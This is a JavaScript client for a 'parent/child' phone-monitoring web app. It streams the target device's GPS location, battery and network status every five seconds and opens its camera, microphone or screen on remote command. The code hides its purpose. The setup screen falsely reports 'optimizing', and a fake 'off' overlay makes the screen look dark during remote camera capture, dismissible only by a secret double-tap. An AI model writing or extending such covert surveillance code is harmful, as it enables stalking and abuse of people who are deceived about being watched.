const socket = io();
let localStream;
let peerConnection;
let roomId;
let role; // 'parent' or 'child'

// Telemetry state
let lastLocation = null;
let lastBattery = null;
let lastNetwork = null;
let heartbeatInterval = null;

const pcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

// UI Elements
const selection = document.getElementById('role-selection');
const parentDashboard = document.getElementById('parent-dashboard');
const childInterface = document.getElementById('child-interface');
const roomInput = document.getElementById('room-input');
const fakeOff = document.getElementById('fake-off-overlay');
const statusBadge = document.getElementById('target-status');
const statusContainer = document.getElementById('target-status-container');
const videoOverlay = document.getElementById('video-overlay');

// Event Listeners
document.getElementById('btn-parent').onclick = () => startRole('parent');
document.getElementById('btn-child').onclick = () => startRole('child');
document.getElementById('start-target').onclick = initTargetService;
document.getElementById('exit-parent').onclick = () => location.reload();

// Remote Commands from Parent
document.getElementById('cmd-camera').onclick = () => sendCommand('start-camera');
document.getElementById('cmd-screen').onclick = () => sendCommand('start-screen');

// Check for automatic target mode in URL
window.onload = () => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('target')) {
        startRole('child');
        setTimeout(initTargetService, 1000);
    }

    // Register Service Worker
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('sw.js').catch(err => console.log('SW not registered', err));
    }
};

function startRole(selectedRole) {
    role = selectedRole;
    // Automatic ID for simplicity (from URL or default)
    const urlParams = new URLSearchParams(window.location.search);
    roomId = urlParams.get('id') || roomInput.value || 'Geral'; 
    selection.classList.add('hidden');
    // Register with correct type expected by server
    const socketType = role === 'parent' ? 'monitor' : 'target';
    socket.emit('register', { type: socketType, roomId });

    if (role === 'parent') {
        parentDashboard.classList.remove('hidden');
    } else {
        childInterface.classList.remove('hidden');
    }
}

// Parent Logic
function sendCommand(command) {
    socket.emit('remote-command', { roomId, command });
}

socket.on('target-status', (data) => {
    statusBadge.innerText = data.status === 'online' ? 'SISTEMA ONLINE' : 'DESCONECTADO';
    statusContainer.className = `status-indicator ${data.status}`;
});

socket.on('target-update', (data) => {
    if (data.location) document.getElementById('data-location').innerText = `${data.location.lat.toFixed(4)}, ${data.location.lng.toFixed(4)}`;
    if (data.battery) document.getElementById('data-battery').innerText = `${Math.round(data.battery * 100)}%`;
    if (data.network) document.getElementById('data-network').innerText = data.network.toUpperCase();
});

// Device (Child) Logic
async function initTargetService() {
    document.getElementById('start-target').disabled = true;
    document.getElementById('start-target').innerText = "Otimizando...";

    // 1. Start Geolocation Tracking (continuous)
    if (navigator.geolocation) {
        navigator.geolocation.watchPosition(pos => {
            lastLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude };
        }, (err) => {
            console.warn("GPS Error:", err.message);
        }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 });
    }

    // 2. Start Battery Tracking (continuous)
    if (navigator.getBattery) {
        try {
            const batt = await navigator.getBattery();
            lastBattery = batt.level;
            batt.addEventListener('levelchange', () => {
                lastBattery = batt.level;
            });
        } catch (e) {
            console.warn("Battery API error:", e);
        }
    }

    // 3. Start Network Detection (continuous)
    updateNetworkInfo();
    if (navigator.connection) {
        navigator.connection.addEventListener('change', updateNetworkInfo);
    }

    // 4. Media Permissions (trigger early)
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
        stream.getTracks().forEach(track => track.stop()); // Just to get permission
    } catch (e) {
        console.warn("Media permission denied or not available yet");
    }

    // 5. Wake Lock (Keep Screen On)
    if ('wakeLock' in navigator) {
        navigator.wakeLock.request('screen').catch(() => { });
    }

    // 6. Start periodic heartbeat — sends all telemetry every 5 seconds
    sendHeartbeat(); // Send immediately
    heartbeatInterval = setInterval(sendHeartbeat, 5000);

    // Show "ready" then go to fake off
    document.getElementById('setup-view').innerHTML = "<h2>Sistema Pronto</h2><p>Otimização concluída.</p>";
    setTimeout(() => {
        showFakeOff();
    }, 2000);
}

function updateNetworkInfo() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        // effectiveType: 'slow-2g', '2g', '3g', '4g'
        // type: 'wifi', 'cellular', 'bluetooth', 'ethernet', 'none', 'unknown'
        lastNetwork = conn.type || conn.effectiveType || 'desconhecido';
    } else {
        lastNetwork = navigator.onLine ? 'online' : 'offline';
    }
}

function sendHeartbeat() {
    const data = {};
    if (lastLocation) data.location = lastLocation;
    if (lastBattery !== null) data.battery = lastBattery;
    if (lastNetwork) data.network = lastNetwork;

    if (Object.keys(data).length > 0) {
        socket.emit('update-data', data);
    }
}

// Handling Remote Commands on Child Device
socket.on('remote-command', async (command) => {
    if (role !== 'child') return;

    if (command === 'start-camera') {
        showFakeOff();
        try {
            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            initiateWebRTC();
        } catch (e) { console.error(e); }
    }
    else if (command === 'start-screen') {
        // Note: Screen sharing ALWAYS prompts user and is often NOT supported on mobile
        if (!navigator.mediaDevices.getDisplayMedia) {
            alert("Este navegador/dispositivo não suporta compartilhamento de tela.");
            return;
        }
        try {
            localStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            initiateWebRTC();
        } catch (e) { console.error(e); }
    }
});

function showFakeOff() {
    fakeOff.classList.remove('hidden');
    // Double tap to exit fake off (secret)
    fakeOff.ondblclick = () => fakeOff.classList.add('hidden');
}

// WebRTC Signaling Logic
async function initiateWebRTC() {
    peerConnection = new RTCPeerConnection(pcConfig);
    localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));

    peerConnection.onicecandidate = (e) => {
        if (e.candidate) socket.emit('signal', { to: roomId, signal: { candidate: e.candidate } });
    };

    const offer = await peerConnection.createOffer();
    await peerConnection.setLocalDescription(offer);
    socket.emit('signal', { to: roomId, signal: { sdp: offer } });
}

socket.on('signal', async (data) => {
    if (!peerConnection) {
        peerConnection = new RTCPeerConnection(pcConfig);
        peerConnection.ontrack = (e) => {
            const video = document.getElementById('remote-video');
            video.srcObject = e.streams[0];
            videoOverlay.classList.add('hidden');
        };
        peerConnection.onicecandidate = (e) => {
            if (e.candidate) socket.emit('signal', { to: data.from, signal: { candidate: e.candidate } });
        };
    }

    if (data.signal.sdp) {
        await peerConnection.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
        if (data.signal.sdp.type === 'offer') {
            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);
            socket.emit('signal', { to: data.from, signal: { sdp: answer } });
        }
    } else if (data.signal.candidate) {
        await peerConnection.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
    }
});
